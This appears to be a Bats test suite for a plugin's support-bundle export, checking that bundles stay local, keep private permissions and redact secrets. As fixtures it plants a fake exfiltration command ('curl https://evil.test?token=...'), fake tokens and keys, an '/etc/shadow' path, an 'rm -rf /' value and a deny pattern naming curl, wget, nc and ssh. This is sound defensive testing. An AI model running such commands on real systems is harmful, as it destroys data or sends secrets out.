load helpers

LIB="$BATS_TEST_DIRNAME/../plugins/nightshift/lib/lib.sh"
EXPORT="$BATS_TEST_DIRNAME/../plugins/nightshift/runtime/export-support.sh"
DOCTOR="$BATS_TEST_DIRNAME/../plugins/nightshift/runtime/doctor.sh"
DOCTOR_SKILL="$BATS_TEST_DIRNAME/../plugins/nightshift/skills/doctor/SKILL.md"
SCRIPT="$BATS_TEST_DIRNAME/../plugins/nightshift/runtime/export-support.sh"

fingerprint() {
  (cd "$1" && find . \( -type f -o -type l \) -exec cksum {} \; | sort)
}

bundle_mode() {
  case "$(uname -s)" in
    Darwin) stat -f %Lp "$1" ;;
    *) stat -c %a "$1" ;;
  esac
}

@test "Doctor offers export and stays read-only" {
  p="$(new_project)"
  before="$(fingerprint "$p")"
  run bash "$DOCTOR" --project "$p"
  [ "$status" -eq 0 ]
  printf '%s' "$output" | grep -q '\[confirm\].*export-support.sh'
  printf '%s' "$output" | grep -qi 'never uploaded'
  after="$(fingerprint "$p")"
  [ "$before" = "$after" ]
  [ ! -d "$p/.nightshift/support" ]
  grep -qF 'export-support.sh' "$DOCTOR_SKILL"
  grep -qF 'Invoking Doctor alone must not create' "$DOCTOR_SKILL"
  grep -qE 'ns"? export-support' "$BATS_TEST_DIRNAME/../docs/commands.md"
  grep -qE 'ns\.ps1"? export-support' "$BATS_TEST_DIRNAME/../docs/commands.md"
}

@test "export writes a 0600 local bundle and never phones home" {
  p="$(new_project)"
  if grep -E 'curl|wget|nc |ssh |scp |npx |pip ' "$SCRIPT"; then
    return 1
  fi
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  printf '%s' "$output" | grep -q 'Support bundle:'
  printf '%s' "$output" | grep -q 'Included:'
  printf '%s' "$output" | grep -q 'Omitted:'
  printf '%s' "$output" | grep -qi 'never uploaded'
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  [ -f "$bundle" ]
  [ "$(bundle_mode "$bundle")" = "600" ]
  grep -q 'Nightshift support bundle' "$bundle"
  grep -q 'name: nightshift' "$bundle"
  grep -q 'validity: valid' "$bundle"
  if grep -q 'DO NOT STOP' "$bundle"; then
    return 1
  fi
}

@test "export reads plugin name without jq" {
  grep -qF 'PLUGIN_NAME="$(sed -n' "$EXPORT"
  p="$(new_project)"
  nojq="$BATS_TEST_TMPDIR/export-nojq"
  mkdir -p "$nojq"
  for t in bash sh sed date mkdir uname cat tr chmod python3 git awk grep head tail cut basename dirname mktemp stat cksum find sort hostname id ps rm mv cp ln touch wc xargs sleep shasum sha256sum cmp tee env true false getconf lsof; do
    command -v "$t" >/dev/null 2>&1 && ln -sf "$(command -v "$t")" "$nojq/$t"
  done
  run env PATH="$nojq" bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  [ -f "$bundle" ]
  grep -qF 'name: nightshift' "$bundle"
  ver="$(sed -n 's/.*"version"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' \
    "$BATS_TEST_DIRNAME/../plugins/nightshift/.claude-plugin/plugin.json" | sed -n 1p)"
  grep -qF "version: $ver" "$bundle"
}

@test "export does not report a symlink ended marker as clocked out" {
  p="$(new_project)"
  : >"$p/.nightshift/ended-plant"
  ln -s ended-plant "$p/.nightshift/.ended"
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  grep -qF 'ended: unusable' "$bundle"
  if grep -qF 'ended: yes' "$bundle"; then
    return 1
  fi
}

@test "export does not report a symlink session-end marker as a clean exit" {
  p="$(new_project)"
  : >"$p/.nightshift/session-end-plant"
  ln -s session-end-plant "$p/.nightshift/.session-end"
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  grep -qF 'session_end: unusable' "$bundle"
  if grep -qF 'session_end: yes' "$bundle"; then
    return 1
  fi
}

@test "export does not report a symlink shift-pulse marker as present" {
  p="$(new_project)"
  : >"$p/.nightshift/pulse-plant"
  ln -s pulse-plant "$p/.nightshift/.shift-pulse"
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  grep -qF 'shift_pulse: unusable' "$bundle"
  if grep -qF 'shift_pulse: yes' "$bundle"; then
    return 1
  fi
}

@test "export does not report a symlink shift-session as a recorded session" {
  p="$(new_project)"
  : >"$p/.nightshift/session-plant"
  ln -s session-plant "$p/.nightshift/.shift-session"
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  grep -qF 'session_record: unusable' "$bundle"
  if grep -qF 'session_record: present' "$bundle"; then
    return 1
  fi
}

@test "export does not report a symlink armed marker as armed" {
  p="$(new_project)"
  : >"$p/.nightshift/armed-plant"
  rm -f "$p/.nightshift/.shift-armed"
  ln -s armed-plant "$p/.nightshift/.shift-armed"
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  grep -qF 'armed: unusable' "$bundle"
  if grep -qF 'armed: yes' "$bundle"; then
    return 1
  fi
}

@test "export does not report a symlink watchman pidfile as present" {
  p="$(new_project)"
  : >"$p/.nightshift/watchman-plant"
  ln -s watchman-plant "$p/.nightshift/.watchman"
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  grep -qF 'watchman_pidfile: unusable' "$bundle"
  if grep -qF 'watchman_pidfile: present' "$bundle"; then
    return 1
  fi
}

@test "support reports lease state but omits the ownership capability" {
  p="$(new_project)"
  printf 'shift-session\n\n\n\nclaude\n' >"$p/.nightshift/.shift-session"
  claim="$(bash -c '. "$1"; ns_lease_takeover "$2/.nightshift" shift-session claude' \
    nightshift "$LIB" "$p")"
  nonce="${claim#* }"

  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  grep -q 'process_lease: valid' "$bundle"
  grep -q 'lease_host: claude' "$bundle"
  grep -q 'lease_mode: recovered' "$bundle"
  if grep -qF "$nonce" "$bundle"; then
    return 1
  fi
}

@test "hostile secrets, URLs, user paths, and transcripts do not survive" {
  p="$(new_project)"
  sid='aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee'
  printf '%s\n/Users/victim/transcript.jsonl\n\n\nclaude\n' "$sid" >"$p/.nightshift/.shift-session"
  python3 -c '
import json,sys
p=sys.argv[1]
with open(p) as f: d=json.load(f)
d["notifyCommand"]="curl https://evil.test?token=s3cret"
d["expectedEmail"]="owner@example.com"
with open(p,"w") as f: json.dump(d,f)
' "$p/.nightshift/rules.json"
  {
    printf 'password=supersecret\n'
    printf 'https://user:hunter2@example.com/hook\n'
    printf 'https://example.com/x?access_token=abcd\n'
    printf '%s/secret-dir/key.pem\n' "$HOME"
    printf '/etc/shadow leaked\n'
    printf 'normal schedule line at %s\n' "$p"
  } >"$p/.nightshift/scheduled.log"
  printf 'PROMPT: do not copy me\n' >"$p/.nightshift/owner-notes.md"
  export NIGHTSHIFT_SUPPORT_LEAK=should-never-appear
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  [ -f "$bundle" ]
  if grep -F 'supersecret' "$bundle"; then
    return 1
  fi
  if grep -F 'hunter2' "$bundle"; then
    return 1
  fi
  if grep -F 's3cret' "$bundle"; then
    return 1
  fi
  if grep -F 'owner@example.com' "$bundle"; then
    return 1
  fi
  if grep -F 'curl https://evil.test' "$bundle"; then
    return 1
  fi
  if grep -F "$sid" "$bundle"; then
    return 1
  fi
  if grep -F 'transcript.jsonl' "$bundle"; then
    return 1
  fi
  if grep -F 'PROMPT: do not copy me' "$bundle"; then
    return 1
  fi
  if grep -F 'should-never-appear' "$bundle"; then
    return 1
  fi
  if grep -F '/etc/shadow' "$bundle"; then
    return 1
  fi
  if grep -F "$HOME/secret-dir" "$bundle"; then
    return 1
  fi
  if grep -qF 'normal schedule line' "$bundle"; then
    return 1
  fi
  grep -q 'keys:' "$bundle"
  grep -q 'notifyCommand' "$bundle"
  grep -q 'session_record: present' "$bundle"
}

@test "default bundle omits scheduled.log tokens and does not claim a secret scanner" {
  p="$(new_project)"
  {
    printf '%s%s\n' 'ghp_' 'PLANTEDTOKENVALUE0000000000000000'
    printf '%s%s\n' 'AKIA' 'IOSFODNN7EXAMPLE'
    printf '%s%s\n' '-----BEGIN RSA ' 'PRIVATE KEY-----'
    printf '%s\n' 'PLANTEDKEYMATERIAL'
    printf '%s%s\n' '-----END RSA ' 'PRIVATE KEY-----'
  } >"$p/.nightshift/scheduled.log"
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  [ -f "$bundle" ]
  if grep -F 'ghp_' "$bundle"; then
    return 1
  fi
  if grep -F 'AKIA' "$bundle"; then
    return 1
  fi
  if grep -F 'PRIVATE KEY' "$bundle"; then
    return 1
  fi
  if grep -F 'PLANTEDKEYMATERIAL' "$bundle"; then
    return 1
  fi
  if printf '%s' "$output" | grep -qF 'Omitted: secrets'; then
    return 1
  fi
  if printf '%s' "$output" | grep -qiE 'secret scanner|scanned for secrets|sanitized'; then
    return 1
  fi
  if grep -qi 'sanitized' "$bundle"; then
    return 1
  fi
  grep -qF '== runtime log ==' "$bundle"
  grep -qF 'omitted' "$bundle"
}

@test "identities are tokenized to the three named roots" {
  p="$(new_project)"
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  grep -qE 'task: \$(WORKSPACE|WORK_TARGET|HOME)' "$bundle"
  if grep -F "$p" "$bundle"; then
    return 1
  fi
}

@test "the support bundle carries the resolved policy view, always redacting the four free-form fields" {
  p="$(new_project)"
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  grep -qF '== resolved policy ==' "$bundle"
  grep -qF 'shift_policy: absent' "$bundle"
  grep -qF 'verificationLevel=none (built-in, -)' "$bundle"
  grep -qF 'toolingPolicy=existing-tools (built-in, -)' "$bundle"
  grep -qF 'elevation.sudo=deny (rules, permanent)' "$bundle"
  grep -qF 'watchMinutes=10 (rules, permanent)' "$bundle"
  # the shipped template's four free-form fields are empty strings, and still redacted.
  grep -qF 'forbiddenCommands=<redacted 0 chars> (rules, permanent)' "$bundle"
  grep -qF 'protectedDirs=<redacted 0 chars> (rules, permanent)' "$bundle"
  grep -qF 'neverCommitPatterns=<redacted 0 chars> (rules, permanent)' "$bundle"
  grep -qF 'expectedEmail=<redacted 0 chars> (rules, permanent)' "$bundle"
  if grep -qF 'forbiddenCommands=""' "$bundle"; then
    return 1
  fi
  if grep -qF '== capability policy ==' "$bundle"; then
    return 1
  fi
}

@test "the support bundle includes evidence counts without raw ledger output" {
  p="$(new_project sb-evidence)"
  mkdir -p "$p/.nightshift/evidence"
  printf '{"schemaVersion":1,"id":"f1","domain":"test","severity":"low","confidence":"medium","impact":"local","status":"open","ladder":"declared","locator":"secret-token=abc","source":"fixture","sourceClass":"test","host":"local"}\n' \
    >"$p/.nightshift/evidence/findings.jsonl"
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  grep -qF '== evidence summary ==' "$bundle"
  grep -qF 'findings=1' "$bundle"
  grep -qF 'liveness:' "$bundle"
  if grep -qF 'secret-token=abc' "$bundle"; then
    return 1
  fi
}

@test "a non-empty free-form pattern is redacted to its length, never its text" {
  p="$(new_project)"
  python3 -c '
import json, sys
p = sys.argv[1]
with open(p) as f:
    d = json.load(f)
d["forbiddenCommands"] = "rm -rf /"
with open(p, "w") as f:
    json.dump(d, f)
' "$p/.nightshift/rules.json"
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  grep -qF 'forbiddenCommands=<redacted 8 chars> (rules, permanent)' "$bundle"
  if grep -F 'rm -rf /' "$bundle"; then
    return 1
  fi
}

@test "a malformed shift-policy.json is reported and never surfaces the raw file" {
  p="$(new_project)"
  printf '{ truncated\n' >"$p/.nightshift/shift-policy.json"
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  grep -qF 'shift_policy: malformed' "$bundle"
  grep -qF 'verificationLevel=none (built-in, -)' "$bundle"
  if grep -F 'truncated' "$bundle"; then
    return 1
  fi
}

@test "the bundle names the resolved policy view instead of a capability policy" {
  p="$(new_project)"
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  printf '%s' "$output" | grep -qF 'the resolved policy view'
  printf '%s' "$output" | grep -qF 'policy files'
  if printf '%s' "$output" | grep -qF 'capability policy'; then
    return 1
  fi
}

LOGIC="$BATS_TEST_DIRNAME/windows/export-support-logic.ps1"
RUN="$BATS_TEST_DIRNAME/windows/run.ps1"
WIN_EXPORT="$BATS_TEST_DIRNAME/../plugins/nightshift/runtime/windows/export-support.ps1"

@test "Windows CI runs the portable export-support allowlist suite" {
  [ -f "$LOGIC" ]
  grep -qF 'export-support-logic.ps1' "$RUN"
  grep -qF 'supersecret' "$LOGIC"
  grep -qF 'lease_mode: recovered' "$LOGIC"
  grep -qF 'Write-NSAtomicLines -Path $tmp -Lines @($lines) -Private' "$WIN_EXPORT"
  grep -qF '[ -L "$NS/.ended" ]' "$EXPORT"
  grep -qF 'Test-NSReparsePoint $endedPath' "$WIN_EXPORT"
  grep -qF 'symlink ended marker is unusable' "$LOGIC"
  grep -qF '[ -L "$NS/.session-end" ]' "$EXPORT"
  grep -qF 'Test-NSReparsePoint $sessionEndPath' "$WIN_EXPORT"
  grep -qF 'symlink session-end marker is unusable' "$LOGIC"
  grep -qF '[ -L "$NS/.shift-pulse" ]' "$EXPORT"
  grep -qF 'Test-NSReparsePoint $pulsePath' "$WIN_EXPORT"
  grep -qF '[ -L "$NS/.shift-session" ]' "$EXPORT"
  grep -qF 'Test-NSReparsePoint $sessionPath' "$WIN_EXPORT"
  grep -qF 'symlink shift-session is unusable' "$LOGIC"
  grep -qF '[ -L "$NS/.shift-armed" ]' "$EXPORT"
  grep -qF 'Test-NSReparsePoint $armedPath' "$WIN_EXPORT"
  grep -qF 'symlink armed marker is unusable' "$LOGIC"
  grep -qF '[ -L "$NS/.watchman" ]' "$EXPORT"
  grep -qF 'Test-NSReparsePoint $watchmanPath' "$WIN_EXPORT"
  grep -qF 'symlink watchman pidfile is unusable' "$LOGIC"
  if grep -E 'curl|wget|nc |ssh |scp |npx |pip ' "$WIN_EXPORT"; then
    return 1
  fi
}

@test "Windows export-support allowlist logic passes when pwsh is present" {
  if ! command -v pwsh >/dev/null 2>&1; then
    return 0
  fi
  run pwsh -NoProfile -NonInteractive -File "$LOGIC"
  [ "$status" -eq 0 ]
}

@test "sanitizer omits secret lines and unresolved absolute paths" {
  run bash -c '. "$1"
    ns_secret_line "password=abc" && echo secret
    ns_sanitize_line "https://x.com?token=1" /tmp /tmp /tmp || echo omitted
    ns_tokenize_text "/tmp/proj/file" /tmp /tmp/proj /tmp/proj/repo && echo
  ' _ "$LIB"
  printf '%s' "$output" | grep -q secret
  printf '%s' "$output" | grep -q omitted
  printf '%s' "$output" | grep -q '\$WORKSPACE/file'
}
